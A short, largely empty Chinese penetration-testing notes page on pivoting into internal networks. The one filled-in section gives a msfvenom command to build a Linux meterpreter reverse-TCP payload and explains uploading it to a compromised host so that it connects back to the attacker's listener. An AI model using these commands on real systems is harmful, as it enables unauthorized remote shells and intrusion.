---
categories: [渗透测试]
tags: 内网渗透 msf 代理 信息收集
---
# 2023.10.10
参考链接:[内网渗透思路](https://www.cnblogs.com/r00tuser/articles/7344853.html)
## 0x01 信息收集
一般先攻入边缘主机，再利用这台边缘主机攻入内网。
### 1.1 收集测试网络环境

***
### 1.2 收集服务器信息

***
### 1.3 内网扫描
#### 端口转发
##### tcp端口转发

##### http转发

***
#### 代理扫描内网
##### http代理转发

##### tcp代理转发
###### 生成msf木马
1. 生成木马
   
   由于攻击机无法访问肉鸡的端口，而肉鸡可以访问攻击机的端口，因此生成一个反向的木马。
    ```
    msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=攻击机ip LPORT=8000 -f elf > shell_8000.elf
    ```
2. 反弹shell
   
    攻击机运行msfconsole，使用exoloit/multi/handler模块，set payload linux/x86/meterpreter/reverse_tcp跟生成木马时用的payload一样。LPORT设置成木马将要连接的端口，运行后会在攻击机上监听一个端口，等待木马链接。

    此时将shell_8000.elf上传 到肉鸡服务器上，添加权限后运行木马将会主动连接上攻击机监听的端口，并在攻击机上获取一个meterpreter shell。
3. 设置路由
   上一步获取到了一个session，这个session是攻击机与肉鸡相互连接的会话。
   
   查看下肉鸡的网络情况：
   
###### 反弹shell

###### 设置路由

##### tcp全局转发

***
#### 端口扫描工具

***
### 1.4 端口转发的逆袭
内网扫描过后的
#### meterpreter实现端口转发

##### 案例

#### lcx端口转发

***

### 1.5 内网扫描
